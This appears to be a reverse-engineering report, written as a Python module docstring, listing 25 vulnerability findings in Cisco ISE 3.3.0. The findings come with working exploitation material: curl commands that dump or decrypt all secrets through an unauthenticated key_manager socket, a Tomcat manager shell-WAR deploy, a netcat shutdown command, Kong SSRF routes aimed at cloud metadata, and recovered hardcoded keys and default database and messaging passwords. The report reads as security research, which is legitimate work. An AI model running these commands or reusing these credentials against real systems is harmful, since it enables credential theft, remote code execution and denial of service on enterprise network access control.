"""
cisco_ise_re.py — Cisco ISE 3.3.0 static RE module

Target: ISE 3.3.0 x86_64 ISO
  /media/cowboy/research/cisco-firmware/ise/Cisco-ISE-3.3.0.430.SPA.x86_64.iso

Extraction chain:
  ISO (9660, label ADEOS) -> Extra/CARSisePkg1.rpm
  -> 7z -> cpio -> gzip tar bundle.tar
  -> CSCOcpm-common-3.3.0-430.x86_64.rpm -> 7z -> cpio
  -> /opt/CSCOcpm/ (Tomcat 9.0.73, JARs, shell scripts)
  -> CSCOcpm-key-manager -> key_manager Python aiohttp service

Application stack:
  - Apache Tomcat 9.0.73 at /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/
  - Oracle DB (cepm user, cpm10 SID) via JDBC thin driver, port 1521
  - vaservice Java daemon
  - ERS API on ports 9060/9061/9062 (External RESTful Services)
  - key_manager: Python aiohttp UNIX socket service (/var/run/key_manager.sock)
  - tpmutil.sh: TPM abstraction layer that delegates ALL TPM ops to key_manager socket
  - Kong API gateway (Docker, ise-kong-container): ports 19001/19444 admin, 8443 proxy
  - PostgreSQL (Docker, ise-postgres-container): port-bound to 127.0.0.1, trust auth
  - RabbitMQ (Docker, ise-rabbitmq-container): ports 8672/8671 AMQP, 15672 management

=== FINDINGS (ISE 3.3.0.430, confirmed 2026-08-25) ===

ISE-F1: key_manager decrypt oracle — unauth ciphertext decryption via UNIX socket [CRITICAL]
ISE-F2: Hardcoded 3DES key -> static Oracle DB credential — decrypts all default-state creds [CRITICAL]
ISE-F3: Tomcat manager — empty-password account [HIGH]
ISE-F4: Hardcoded Tomcat shutdown secret [LOW]
ISE-F5: TLSv1/TLSv1.1 enabled on ERS port 8906 [MEDIUM]
ISE-F6: Kong Admin API exposed on 0.0.0.0:19001/19444 with no authentication [CRITICAL]
ISE-F7: RabbitMQ loopback_users.guest=false + plaintext management port 15672 [HIGH]
ISE-F8: PostgreSQL trust auth (no password) accessible from Docker bridge network [MEDIUM]
ISE-F9: IRF RabbitMQ user irf:irf hardcoded, administrator tag, vhost irf [HIGH]
ISE-F10: SSE Connector port 8989 all-interfaces + push_cmd=true + FileUpload=true [HIGH]
ISE-F11: EDDA container -v /var/run/:/host/var/run/ --network=host = key_manager escape [CRITICAL]
ISE-F12: GET /api/system/v1/key-manager/all_data — full in-memory credential dump, no auth [CRITICAL]
ISE-F13: ExecStartPost=chmod o+w key_manager.sock — world-writable socket post-start [HIGH]
ISE-F14: PBIS (AD connector) SendNTLMv2=false default — NTLMv1 used for AD auth [MEDIUM]
ISE-F15: PBIS LdapSignAndSeal=false default — unsigned LDAP queries to AD domain controller [HIGH]
ISE-F16: CA Tomcat hardcoded manager:password in tomcat-users.xml (port 9444) [CRITICAL]
ISE-F17: CA Tomcat default SHUTDOWN secret on port 8105 [LOW]
ISE-F18: CA REST API / OCSP responder running plain HTTP (ports 9444, 2560) [HIGH]
ISE-F19: CA NSS DB plaintext password window — ca_nssdb_password.txt no chmod before encryption [HIGH]
ISE-F20: SQL schema hardcoded Oracle creds — Mali:Mali (plaintext PIP) + handleruser:mohammal (3DES) [CRITICAL]
ISE-F21: Elasticsearch 6.8.12 on localhost:9200, no auth, no TLS — ISE MNT auth/RADIUS logs [MEDIUM]
ISE-F22: pi-profiler Docker image hardcoded RabbitMQ dev credential + Actuator admin [MEDIUM]
ISE-F23: ESAPI hardcoded MasterKey + MasterSalt — decrypts all ESAPI-protected web layer values [HIGH]
ISE-F24: ActiveMQ JMS broker anonymous access — null/null credentials, PAP/PDP policy topics unprotected [MEDIUM]
ISE-F25: Kairos AI agent hardcoded production cloud endpoint + version disclosure [LOW]

=== ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===

Service: /usr/lib/python3.6/site-packages/ise_key_manager/server/key_manager_server.py
Socket:  /var/run/key_manager.sock  (UNIX domain, no auth)
Second socket: /var/run/tpm2_manager.sock  (TPM2 manager, key_manager communicates with this internally)
Routes (no caller authentication on any endpoint):
  GET  /api/system/v1/key-manager/all_data     -> dumps ALL cached TPM2 secrets + tpm2_mgr_password
  POST /api/system/v1/key-manager/decrypt      -> decrypts arbitrary ciphertext with cached passphrase
  POST /api/system/v1/key-manager/encrypt      -> encrypts arbitrary plaintext with cached passphrase
  POST /api/system/v1/key-manager/seal         -> seals data in TPM2 (caller-supplied data_type)
  POST /api/system/v1/key-manager/unseal       -> unseals data from TPM2
  GET  /api/system/v1/key-manager/health       -> health check (requires is_initialized=True)
  GET  /api/system/v1/key-manager/random       -> get TPM2-sourced random bytes (NO init check)
  POST /api/system/v1/key-manager/init         -> initialize with caller-supplied passphrase (pre-init only)

key_manager encryption algorithm (encryption_manager.py):
  encrypt(passphrase, plaintext):
    key = SHA256(passphrase.encode('utf-8')).digest()  # AES-256 key via SHA256 of passphrase
    IV = Random.new().read(16)                          # random 16-byte IV
    return base64(IV + AES_CBC_PKCS5(key, IV, plaintext))
  decrypt(passphrase, ciphertext_b64):
    raw = base64.decode(ciphertext_b64)
    key = SHA256(passphrase.encode('utf-8')).digest()
    IV = raw[:16]; ct = raw[16:]
    return AES_CBC_PKCS5_decrypt(key, IV, ct)

Passphrase: the key_mgr_passphrase sealed in TPM2, returned by /all_data endpoint.
Key record: /etc/ise/tpm2/key_manager_record.json (list of sealed_keys with data_type/key_name)

Hermes binary (hermes.bin, Go) confirms calling key_manager at runtime:
  String: "http://unix/api/system/v1/key-manager/decrypt"
  -> Hermes decrypts pxGrid cert passwords and ERS creds via this socket.

db.properties dev DB link (commented-out, confirming ISE-F2 key scope):
  #DB_LINKS_HC=Link209:psctest:fG5w7wguLks=:10.77.116.209:1521:pscor209
  fG5w7wguLks= -> 'psctest' (Cisco internal dev DB on 10.77.116.209)

TPM abstraction: tpmutil.sh (called by all ISE crypto ops including genkekkey.sh, setdbpw.sh)
  tpmutil.sh decrypt <data>:
    curl -XPOST --unix-socket /var/run/key_manager.sock \
      --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"'"$1"'"}}}' \
      http://localhost/api/system/v1/key-manager/decrypt

decrypt handler (key_manager_server.py):
  async def decrypt(self, request):
    data = req["msg"]["params"]["data"]  # arbitrary ciphertext, no validation
    decrypted_text = decrypt(get_sealed_key_from_cache(...), data)  # direct decrypt
    return web.json_response({"result": decrypted_text.decode()})
    # NO authentication check. Any local process gets plaintext.

Direct credential extraction (one command from any local process):
  curl -s --unix-socket /var/run/key_manager.sock -XPOST \
    -H "Content-Type: application/json" \
    --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"pTZv2LEjfGPX5YICzJb95g=="}}}' \
    http://localhost/api/system/v1/key-manager/decrypt
  # Returns: {"result": "U0l1_6v#k3c"} (Oracle DB password)

  # For live rotated installs, read PAP_ADMIN_PWD from db.properties and submit:
  DB_CIPHER=$(grep PAP_ADMIN_PWD /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties | cut -d= -f2)
  curl -s --unix-socket /var/run/key_manager.sock -XPOST \
    -H "Content-Type: application/json" \
    --data '{"msg_type":"POST","version":1,"msg":{"action":"decrypt","params":{"data":"'"$DB_CIPHER"'"}}}' \
    http://localhost/api/system/v1/key-manager/decrypt

Impact:
  - One-command Oracle SYSDBA credential extraction from any local process
  - Bypasses TPM2, KEK, and all ISE key management architecture
  - Works on ALL ISE 3.3.0 deployments (default + rotated installs) once initialized
  - Combined chain: any RCE / SSRF → key_manager socket → Oracle password → SYSDBA

=== ISE-F6: Kong Admin API — unauthenticated, 0.0.0.0 binding ===

Source: kong-control.sh:
  -e "KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl"
  -p $KONG_ADMIN_PORT_MAP:$KONG_ADMIN_PORT          # KONG_ADMIN_PORT_MAP=19001
  -p $KONG_ADMIN_SSL_PORT_MAP:$KONG_ADMIN_SSL_PORT  # KONG_ADMIN_SSL_PORT_MAP=19444

Host exposure:
  <ise_host>:19001  Kong Admin API (HTTP, no TLS, no auth)
  <ise_host>:19444  Kong Admin API (HTTPS, no auth)

Kong Admin API (v2) is unauthenticated by default. Any client that reaches port 19001/19444
can perform full API gateway administration:
  GET  http://<ise_host>:19001/                      -> Kong version, config
  GET  http://<ise_host>:19001/services              -> all proxied services
  GET  http://<ise_host>:19001/routes                -> all routes
  GET  http://<ise_host>:19001/consumers             -> all API consumers
  GET  http://<ise_host>:19001/plugins               -> all plugins (auth, rate-limit, etc.)
  POST http://<ise_host>:19001/services              -> add proxy service (SSRF pivot)
  POST http://<ise_host>:19001/routes                -> add route
  DELETE http://<ise_host>:19001/services/{id}       -> delete service (DoS)

Attack chain:
  1. Access ISE port 19001 from enterprise LAN
  2. List existing routes: GET /routes -> reveal internal ISE API topology
  3. Add SSRF route: POST /services {url:"http://169.254.169.254/"} -> cloud metadata
  4. Add route for SSRF target: POST /routes {paths:["/ssrf"], service.id:...}
  5. Access <ise_host>:8443/ssrf -> reach internal services via Kong proxy
  6. Alternatively: DELETE all routes -> take down ISE's API gateway (DoS)

ISE's API gateway controls:
  - pxGrid topic routing
  - ERS API access
  - Integration with external security platforms (Cisco Secure, SIEM, SOAR)
  Full admin control = intercept policy decisions, poison network access controls.

=== ISE-F7: RabbitMQ guest access + plaintext management ===

Source: rabbitmq.conf:
  loopback_users.guest = false    # guest:guest auth allowed from non-loopback
  management.listener.port = 15672
  management.listener.ssl = false  # plaintext HTTP, credentials sent unencrypted

Port bindings (docker create):
  -p 8672:5672    # AMQP plaintext (no TLS) — host-wide binding
  -p 8671:5671    # AMQP TLS
  -p 15672:15672  # Management HTTP — host-wide binding, no TLS

Pre-setup window (before control script deletes guest):
  HTTP: http://<ise_host>:15672  credentials: guest:guest
  AMQP: amqp://guest:guest@<ise_host>:8672/

Management API (15672):
  GET /api/overview       -> broker version, cluster name, message rates
  GET /api/exchanges      -> all exchanges
  GET /api/queues         -> all queues + message counts
  GET /api/connections    -> active connections
  POST /api/exchanges/{vhost}/{name}/publish -> publish arbitrary messages

ISE uses RabbitMQ for internal service bus (ERS events, pxGrid notifications, policy push).
Injecting messages into ISE's internal messaging bus = policy poisoning vector.
After guest deletion, ISE uses `rabbitmq` user with password from db.properties
(same decrypt-oracle chain as ISE-F1 applies to RABBITMQ_PWD).

=== ISE-F12: key_manager all_data — unauthenticated full credential dump ===

Source: key_manager_server.py (ise_key_manager-1.0.0-1.x86_64.rpm)
  GET /api/system/v1/key-manager/all_data

Handler (key_manager_server.py lines 476-507):
  @ensure_key_manager_is_initialized   <- NOT an auth check; checks inst.is_initialized
  async def get_all_data(self, request):
      ...
      response = get_tpm2_manager_password()  # fetches TPM2 manager password
      self.key_manager_cache = dict(self.key_manager_cache, **result)  # merges into cache
      return web.json_response({"result": self.key_manager_cache}, status=200)

ensure_key_manager_is_initialized (utils.py lines 16-29):
  async def is_initialized(inst, *args, **kwargs):
      if inst.is_initialized:          # True on any running ISE system
          return await func(inst, *args, **kwargs)
      else:
          return aiohttp.web.json_response({"error": "..."}, status=503)

Response contains self.key_manager_cache, which includes:
  {
    "sealed_keys": [
      {"data_type": "key_mgr_passphrase", "data": "<64-char hex passphrase>", ...},
      {"data_type": "oracle_db_password", "data": "<Oracle SYS password>", ...},
      {"data_type": "meraki_api_key", "data": "<Meraki admin key>", ...},
      ...  # ALL data_types sealed by ANY ISE component via key_manager
    ],
    "tpm2_mgr_password": "<20-char TPM2 manager password>"
  }

This is the top-tier variant of ISE-F1: whereas /decrypt requires submitting a known ciphertext,
/all_data requires NO input and returns ALL secrets in a single GET request.

One-liner from any local process (ISE-F13 makes socket world-writable):
  curl -s --unix-socket /var/run/key_manager.sock \
    http://localhost/api/system/v1/key-manager/all_data

Attack chain:
  1. Any local access (ISE-F11 EDDA shell, cron, sudo, ISE service process)
  2. GET /api/system/v1/key-manager/all_data via world-writable socket (ISE-F13)
  3. Extract key_mgr_passphrase + ALL sealed secrets in one response
  4. No further decryption steps needed — all data is already in plaintext

=== ISE-F13: key_manager.service world-writable socket via ExecStartPost ===

Source: /usr/lib/systemd/system/key_manager.service (ise_key_manager-1.0.0-1.x86_64.rpm)

Socket unit (key_manager.socket):
  ListenStream=/var/run/key_manager.sock
  SocketMode=0600     <- root-only at creation
  SocketUser=root

Service unit ExecStartPost (key_manager.service):
  ExecStartPost=chmod o+w /var/run/key_manager.sock   <- OVERWRITES to world-writable

After this ExecStartPost, effective permissions are 0602 (rw------w-):
  - Owner (root): read + write
  - Other (world): write     <- UNIX domain socket write perm = connect perm

Result: ANY local process on ISE (any UID, any user, any container with /var/run/ mount)
can connect to the key_manager socket and call any of its endpoints.

This is the root enabler for ISE-F1, ISE-F11, ISE-F12:
  - ISE-F1: /decrypt oracle accessible to all local processes
  - ISE-F11: EDDA container with -v /var/run/:/host/var/run/ gets world-writable socket
  - ISE-F12: /all_data full dump accessible to all local processes

The intended design (as evidenced by SocketMode=0600 in the socket unit) was root-only access.
The ExecStartPost chmod is either a development shortcut or ISE service compatibility fix
that was shipped to production, negating all UNIX socket access control.

Remediation: Remove chmod line; add SocketGroup=ise-services or specific GIDs for callers.

=== ISE-F14: PBIS AD connector — NTLMv1 default (SendNTLMv2=false) ===

Source: CSCOcpm-ad-3.3.0-430.x86_64.rpm (oem17-open-7.1.1)
Config: /opt/pbis/share/config/lsassd.reg

PBIS AD connector configuration:
  [HKEY_THIS_MACHINE\\Services\\lsass\\Parameters\\NTLM]
  "SendNTLMv2" = dword:00000000    <- NTLMv1 is the default
  "SupportNTLM2SessionSecurity" = dword:00000001
  "SupportKeyExchange" = dword:00000001
  "Support56bit" = dword:00000001
  "Support128bit" = dword:00000001

  [HKEY_THIS_MACHINE\\Services\\lsass\\Parameters\\Providers\\Local]
  "AcceptNTLMv1" = dword:00000001   <- local auth accepts NTLMv1

Impact: NTLMv1 is DES-based and crackable with rainbow tables or specialized hardware.
The "1122334455667788" challenge trick: force challenge bytes → response = LM/NTLMv1 hash
  → hashcat attack → crack in minutes to hours on GPU cluster.

Kerberos enctype config (pbis-krb5-ad.conf):
  default_tgs_enctypes = AES256-CTS AES128-CTS RC4-HMAC DES-CBC-MD5 DES-CBC-CRC
  preferred_enctypes = AES256-CTS AES128-CTS RC4-HMAC DES-CBC-MD5 DES-CBC-CRC

RC4-HMAC (arcfour) in the preferred list enables:
  - AS-REP roasting if pre-auth not enforced for any ISE service account
  - Pass-the-hash (RC4 = NTLM hash, no plaintext needed)
DES-CBC-MD5/DES-CBC-CRC: weak enctypes, effectively broken.

Attack: With network position between ISE and AD DC:
  1. Capture NTLM challenge/response during ISE user authentication
  2. NTLMv1: crack offline with rainbow tables (LM hash if short) or GPU cluster
  3. Pass-the-hash to AD: authenticate as user without password

Scope: Affects ISE deployments joined to AD via PBIS (all ISE 3.3.0 deployments with AD join).

=== ISE-F15: PBIS AD connector — unsigned/unsealed LDAP queries (LdapSignAndSeal=false) ===

Source: CSCOcpm-ad-3.3.0-430.x86_64.rpm (oem17-open-7.1.1)
Config: /opt/pbis/share/config/lsassd.reg

  [HKEY_THIS_MACHINE\\Services\\lsass\\Parameters\\Providers\\ActiveDirectory]
  "LdapSignAndSeal" = dword:00000000   <- LDAP traffic is NOT signed or sealed by default

Impact: PBIS issues unsigned LDAP queries to the Active Directory domain controller.
Without LDAP signing, an attacker with MITM position on the network can:
  1. Intercept LDAP query (e.g., "is user X member of ISEAdmin group?")
  2. Inject false LDAP response ("yes, member of ISEAdmin")
  3. Result: unauthorized ISE admin access for attacker-controlled user

PBIS MultiTenancyEnabled = true (supports joining multiple AD domains simultaneously):
  Multiple LDAP trust relationships = expanded MITM injection surface.

PBIS SAMR/LSARPC socket: /var/lib/pbis/rpc/lsass (UNIX domain, permissions unknown at rest).
  Exposes SAMR, LSARPC, DSSETUP, WKSSVC interfaces — not TCP-exposed by default.
  RegisterTcpIp = false for all RPC servers (correct config, no external exposure).

Machine password storage: PBIS stores machine account credential in SQLite
  at /var/lib/pbis/db/ (lsasqlite.c, linked libsqlite3.so.0, liblsapstore.so.0).
  Encrypted with machine-specific key, not ISE key_manager.
  Root access required to read; key_manager chain (ISE-F1) doesn't reach PBIS pstore.

=== ISE-F11: EDDA container — key_manager socket escape via /var/run mount ===

Source: CSCOcpm-edda-3.3.0-430.x86_64.rpm
Binary: edda-url-fetcher.bin (Go, not stripped, 15MB)
Control: edda-control.sh / edda.properties

Docker launch (from edda.properties):
  edda.extra_arguments=--network=host \
    -v /opt/edda/connector-config:/connector-config \
    -v /opt/edda/config:/config \
    -v /opt/CSCOcpm/logs:/logs \
    -v /opt/xgrid:/opt/xgrid \
    -v /opt/edda/cert:/opt/edda/cert \
    -v /var/run/:/host/var/run/   <-- CRITICAL: host /var/run/ mounted into container

Key mount impact:
  /host/var/run/key_manager.sock  <- key_manager UNIX socket accessible from EDDA container
  /host/var/run/docker.pid        <- Docker daemon accessible
  --network=host                  <- EDDA shares ISE host network namespace

Binary confirms: cisco.com/cpm/pkg/crypto.DecryptWithTPM in edda-url-fetcher.bin
  EDDA calls key_manager.sock for decrypting credentials at runtime.
  With /host/var/run/ mount, the key_manager socket path inside the container:
    /host/var/run/key_manager.sock

Chain: EDDA SSRF/injection -> shell in container -> curl /host/var/run/key_manager.sock ->
  Oracle DB password + Meraki API key (same F1 blast radius, from inside the container).

EDDA function: URL fetcher for pxGrid Direct (fetches external URLs, parses YAML configs,
  stores results in Redis at localhost:6379 via --network=host).

URL fetch surface (from symbol analysis):
  main.fetch / main.eddaUrlFetcher / main.fetchJsonResponse / main.parseUrlTemplateString
  URL templates are user-controlled (from pxGrid Direct admin UI -> /connector-config/*.yaml).
  If URL template injection → SSRF or local file read via EDDA → container escape.

Redis at localhost:6379 (host network): all Redis data (endpoint records, pxGrid sessions)
  accessible from EDDA container without auth (standard ISE Redis, no password).

Attack chain:
  1. Compromise EDDA URL fetcher (SSRF, template injection, or ISE-F6 Kong route injection)
  2. Shell in edda-url-fetcher container
  3. curl --unix-socket /host/var/run/key_manager.sock /decrypt -> Oracle DB password
  4. psql system/<pw>@localhost:1521/cpm10 -> full ISE database

=== ISE-F10: SSE Connector — 0.0.0.0:8989 + push_cmd + FileUpload ===

Source: CSCOcpm-SSEConnector-3.3.0-430.x86_64.rpm
Binary: connector_linux_amd64_1.9.22 (Go, not stripped)
Config: /opt/sse/conf/connector.toml

connector.toml:
  server_port = 8989
  interface = "all"          # binds to 0.0.0.0, not localhost
  [Globals.HTTPSServer]
  enabled = true             # TLS on port 8989

bd_enabled_connector.toml (Business Domain enabled mode):
  push_cmd = true            # SSE cloud can push and execute commands on ISE
  [Globals.Contexts.FileUpload]
  enabled = true             # file upload capability active
  [Globals.Contexts.Messaging]
  enabled = true

API routes (gorilla/mux, confirmed from binary):
  POST /v1/contexts/          ContextCreationHandler
  GET  /v1/contexts           ContextListHandler
  *    /v1/contexts/{ctxt_id} ContextLookupHandler + others
  *    /v1/contexts/{ctxt_id}/services/registry   NoCertTokenHandler (NO CLIENT CERT)
  *    /v1/contexts/{ctxt_id}/services/token       EventHandler
  *    /v1/contexts/{ctxt_id}/services/eventsws    RegistrationTokenHandler
  *    /v1/contexts/{ctxt_id}/services/proxyreg
  *    /v1/contexts/{ctxt_id}/services/wsproxy     WSProxyHandler
  *    /v1/contexts/{ctxt_id}/services/httpproxy   HTTPProxyHandler
  POST /v1/action             ActionHandler

NoCertTokenHandler at /v1/contexts/{ctxt_id}/services/registry:
  - Accepts POST, Content-Type: application/json
  - NO client cert check (name is explicit)
  - Handles connector-to-SSE pre-registration (JWT issuance without device cert)
  - ctxt_id from URL path, not validated against a pre-authorized set

HTTPProxyHandler / WSProxyHandler:
  - Proxy mode allows SSE cloud to route arbitrary HTTP through ISE's network position
  - With push_cmd=true: SSE cloud can send command execution directives

Attack surface:
  1. Port 8989 is TLS but NOT verified mTLS on the NoCertToken endpoint
  2. Any LAN host that reaches ISE:8989 can POST to /v1/contexts/{ctxt_id}/services/registry
  3. Legitimate threat: SSE cloud compromise -> push_cmd to all connected ISE instances
  4. HTTPProxy/WSProxy routes: pivot through ISE to internal services
  5. FileUpload endpoint: write arbitrary files to ISE filesystem

ISE runs as `isesse` user — SSE file upload target: /opt/sse/data/ (writable by isesse).
Command execution via push_cmd writes to ISE action log, executes as isesse.

=== ISE-F9: IRF RabbitMQ hardcoded administrator credential ===

Source: irf-control.sh (CSCOcpm-irf-3.3.0-430.x86_64.rpm):
  IRF_RABBIT_USER="irf"
  IRF_RABBIT_USER_PWD="irf"
  IRF_RABBITMQ_VHOST="irf"
  rabbitmqctl add_user irf irf
  rabbitmqctl set_user_tags irf administrator
  rabbitmqctl set_permissions -p irf irf ".*" ".*" ".*"

The irf:irf user has administrator tag — full RabbitMQ management access.
Vhost "irf" handles IRF adapter messaging (AMP/CTA threat intel events, vulnerability reports).

Access via RabbitMQ management API on port 15672 (ISE-F7/F8 chain):
  curl -u irf:irf http://<ise_host>:15672/api/queues/irf
  curl -u irf:irf http://<ise_host>:15672/api/exchanges/irf
  curl -u irf:irf http://<ise_host>:15672/api/overview

IRF handles:
  - Cisco Secure Endpoint (AMP) threat events -> ISE quarantine decisions
  - Vulnerability scanner (Tenable/Qualys/Nexpose) reports -> ISE adaptive policy
  - CTA (Cognitive Threat Analytics) events

Injecting messages into the irf vhost = poison threat intelligence fed to ISE,
potentially triggering incorrect quarantine or policy changes across the network.

Also confirmed: irf.sh config.json hardcodes:
  "mongoUrl": "mongodb://irf-mongo-runtime/irf-core-engine"  (no auth)
  MongoDB runs without --auth -> all AMP OAuth tokens, scanner API keys stored unauth.
  MongoDB accessible from irf-internal-nw (169.254.1.0/24) only.

=== ISE-F1 extended blast radius: key_manager oracle controls ALL ISE credentials ===

Confirmed binaries using key_manager /decrypt endpoint:
  - tpmutil.sh (all ISE services)       -> Oracle DB password
  - mctrust.bin                         -> Meraki API key (network policy control)
  - (Expected from hermes.bin analysis) -> pxGrid certs/tokens
  - (Expected from ise-ai-agent)        -> AWS SDK credentials

mctrust.bin symbol: cisco.com/cpm/pkg/crypto.DecryptWithTPM
mctrust.bin string: "http://unix/api/system/v1/key-manager/decrypt"
  -> mctrust calls key_manager.sock for decrypting the Meraki org API key at runtime.

Meraki API key access enables:
  - GET  /api/v1/organizations -> enumerate all managed orgs
  - GET  /api/v1/organizations/{orgId}/adaptivePolicy/acls -> ISE-Meraki ACL state
  - POST /api/v1/organizations/{orgId}/adaptivePolicy/acls -> inject ACL rules
  - DELETE -> remove ACL rules (network access control DoS)
  - /admin/API/trustsec/meraki/sync/* -> trigger out-of-band policy sync

So: any local process -> key_manager.sock/decrypt + db.properties or mctrust config
  = Oracle SYSDBA + Meraki admin API key = FULL ISE + FULL Meraki network control.

=== ISE-F8: PostgreSQL trust auth ===

Source: pg_hba.conf:
  local all postgres trust                              # UNIX socket: postgres superuser = no password
  host postgres kong  169.254.4.0/24 trust             # Kong's Docker bridge: no password
  host postgres postgres 169.254.4.0/24 trust          # postgres super from bridge: no password

POSTGRES_HOST_AUTH_METHOD=trust (docker env) — all connections during init = trust.

Port: 127.0.0.1:$POSTGRES_PORT (localhost-only, not network-exposed directly).
  Reachable from: any local process on ISE host, via ISE-F1 chain (local process).
  psql -h 127.0.0.1 -U postgres -d postgres -> no password, superuser shell.
  Kong's config (services, routes, consumers, API keys) stored here.

=== ISE-F2: Hardcoded 3DES key — default Oracle DB credential ===

JAR:   PSP-Commons-3.3.0-430.jar
Class: com.cisco.epm.auth.encryptor.crypt.DefaultCryptEncryptor
Field: encryptionKey (set in <init>, offset 5): "ASDF asdf 1234 8983 jkla"

Bytecode evidence:
  5: ldc #2  // String ASDF asdf 1234 8983 jkla
  7: putfield #3  // Field encryptionKey:Ljava/lang/String;

staticInitMethod logic:
  if db.properties.KEK_KEY != null:
    newEncryptionKey = Base64.decode(TPMUtil.decrypt(KEK_KEY))  ; TPM-sealed path
    useNewKey = true
  else:
    useNewKey = false  ; default/pre-install state

encrypt() when useNewKey=false:
  key = encryptionKey.getBytes()  ; 24 bytes of "ASDF asdf 1234 8983 jkla"
  algo = "DESede"
  Crypt(algo, key)  ; SecretKeySpec(24-byte key, "DESede") -> 3DES-ECB

db.properties (shipped default):
  PDP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_ADMIN_PWD = pTZv2LEjfGPX5YICzJb95g==
  ISE_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==

Decryption:
  key = b'ASDF asdf 1234 8983 jkla'   # 24 bytes -> DESede-3 (K1=bytes[0:8], K2=bytes[8:16], K3=bytes[16:24])
  ct  = base64.decode("pTZv2LEjfGPX5YICzJb95g==")  # 16 bytes
  pt  = 3DES_ECB_decrypt(key, ct)
     = b'U0l1_6v#k3c\x05\x05\x05\x05\x05'  # PKCS5 padding valid

Default Oracle DB password (all accounts): U0l1_6v#k3c
  - cepm / cpm10 SID
  - mnt / mnt10 SID
  - strmadmin
  - sys (SYSDBA) — set by setdbpw.sh: resetOraclePw sys $DBADMINPWD
  - system — set by setdbpw.sh: resetOraclePw system $DBADMINPWD

Scope: applies to any ISE 3.3.0 deployment that has NOT completed cpminitialsetup.sh KEK rotation.
  Fully-initialized deployments use TPM-sealed KEK (AES-CBC path, useNewKey=true).
  ISE-F1 + ISE-F2 chain: F1 extracts TPM-sealed KEK passphrase -> decrypt KEK ->
    decrypt PAP_ADMIN_PWD from live db.properties -> Oracle SYSDBA access.

=== ISE-F3: Tomcat manager — empty-password account ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/tomcat-users.xml
Entry: <user username="user" password="" roles="manager-script,manager-jmx,manager-status"/>

Roles granted:
  manager-script — /manager/text/ HTTP API: deploy/undeploy WAR, list, sessions
  manager-jmx    — /manager/jmxproxy/ JMX proxy for MBeans
  manager-status — /manager/status/ server status page

manager-script API endpoints (no additional auth beyond realm creds):
  PUT  /manager/text/deploy?path=/exploit      -> deploy WAR -> RCE
  GET  /manager/text/list                      -> enumerate deployed apps
  POST /manager/text/sessions?path=/exploit    -> session management

Exploitation:
  curl -u 'user:' 'http://<ise-host>:8080/manager/text/list'
  curl -u 'user:' -T shell.war 'http://<ise-host>:8080/manager/text/deploy?path=/shell'

Note: Tomcat manager is bound to Tomcat's internal port (likely 8080 or 443).
  ISE normally restricts external access; exploit is viable from same host or internal net.
  Tomcat shutdown (F4) + empty-password manager = full Tomcat takeover without network auth.

=== ISE-F4: Hardcoded Tomcat shutdown secret ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Entry: <Server port="8005" shutdown="721AzznFfen8pMjy">

Shutdown is initiated by a plain TCP connection to port 8005 sending the secret string.
Identical across all ISE 3.3.0 installations (static in shipped ISO).

Exploit (from localhost or if port 8005 is reachable):
  echo -n '721AzznFfen8pMjy' | nc localhost 8005

Impact: Tomcat process termination -> ISE admin UI / ERS API / portal down (DoS).
  Useful as a forcing function during an incident to create outage window.

=== ISE-F5: TLSv1/TLSv1.1 on ERS port 8906 ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Connector port="8906":
  sslEnabledProtocols="TLSv1,TLSv1.1,TLSv1.2"
  clientAuth="want"

Allows TLS 1.0/1.1 handshake. Enables:
  - POODLE (CVE-2014-3566) against TLSv1.0 CBC suites
  - BEAST (CVE-2011-3389) against TLSv1.0 CBC suites
  - Protocol downgrade to 1.0 if client and server both support it

clientAuth="want" means client cert is requested but not required -> optional mTLS.

=== ISE-F20: SQL schema hardcoded Oracle credentials ===

Source: CSCOcpm-db-3.3.0-430.x86_64.rpm
File:   /opt/CSCOcpm/db/sql/CreateCpmTables.sql

Two distinct Oracle credential paths hardcoded in the shipped DB schema:

1) Mali:Mali — plaintext PIP credential
   Table: SEC_PIP_MASTER (Policy Information Point)
   INSERT: SEC_PIP_NAME='Entitlement Repository'
     SEC_PIP_PROP = '<pip source-type="database">
       <property name="url">jdbc:oracle:thin:@localhost:1521:cpm10</property>
       <property name="username">Mali</property>
       <property name="password">Mali</property>'

   The Oracle connection credential for the ISE PIP database connector is stored
   PLAINTEXT in the SQL schema. If the Mali Oracle user exists in cpm10, any attacker
   who reads this SQL file has the credential. Shipped in the ISO, not generated at install.

2) handleruser:mohammal — 3DES-encrypted handler credential (decrypted with ISE-F2 key)
   Table: SEC_HANDLER_PROPERTIES (PAP Post-hook Handlers)
   Handlers: UserHandler, GroupHandler, RoleHandler, UserGroupMappingHandler, ParentGroupHandler,
             EntitlementAttributeHandler, SecretsHandler (7 total, all same password)
   INSERT: username='handleruser', password='1GOnYUy8rmREq6iEZjvEnQ==', SEC_IS_ENCRYPT='True'

   Decryption (ISE-F2 key):
     DES3.new(b'ASDF asdf 1234 8983 jkla', DES3.MODE_ECB).decrypt(
       b64decode('1GOnYUy8rmREq6iEZjvEnQ=='))[:-5]
     = b'mohammal'

   Connection: jdbc:oracle:thin:@localhost:1521:cpm10
   Oracle user: handleruser, password: mohammal

Both credentials authenticate to the Oracle cpm10 DB. Combined with Oracle port 1521
being accessible from within ISE (local + mnthost): any foothold = DB access.

Additionally confirmed in initcpm10.ora:
  os_authent_prefix=''  (OS auth enabled, empty prefix)
  audit_trail='NONE'    (no Oracle audit logging)
  remote_os_authent=FALSE (local-only OS auth)

Oracle OS auth path (as oracle OS user, no password required):
  su - oracle -c "sqlplus -s /@system10 as sysdba"
  -> SYSDBA access, no credential needed, no audit trail

=== ISE-F21: Elasticsearch 6.8.12 localhost:9200, no auth ===

Source: CSCOcpm-elasticsearch-3.3.0-430.x86_64.rpm
Files:  /opt/CSCOcpm/elasticsearch-6.8.12/config/elasticsearch.yml
        /opt/CSCOcpm/bin/elasticsearch-control.sh

